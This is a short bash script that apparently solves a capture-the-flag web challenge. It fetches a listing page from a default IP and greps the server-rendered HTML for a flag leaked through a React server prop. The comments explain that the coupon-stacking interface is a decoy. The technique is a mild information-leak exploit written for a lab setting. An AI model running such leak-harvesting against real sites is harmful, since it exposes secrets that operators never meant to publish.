#!/usr/bin/env bash
# solve-web4-coupon.sh — riffhack web4 (coupon stacking / SSR prop leak)
#
# The /listing/macro-builder page ships a `couponFlag` React server prop
# inlined into its SSR HTML. The coupon-stacking UI is a misdirection — the
# value is already in the page on first byte.
#
# Usage: solve-web4-coupon.sh <host>
set -euo pipefail

HOST="${1:-159.89.230.27}"
echo "[*] web4 (coupon stacking → SSR prop) against $HOST"

echo "[*] grepping /listing/macro-builder for couponFlag:"
flag=$(curl -sk "http://$HOST/listing/macro-builder" | grep -oE 'bitflag\{[^}]+\}' | head -1)

if [[ -n "$flag" ]]; then
  echo "[+] FLAG: $flag"
else
  echo "[-] couponFlag not found in SSR HTML" >&2
  exit 1
fi
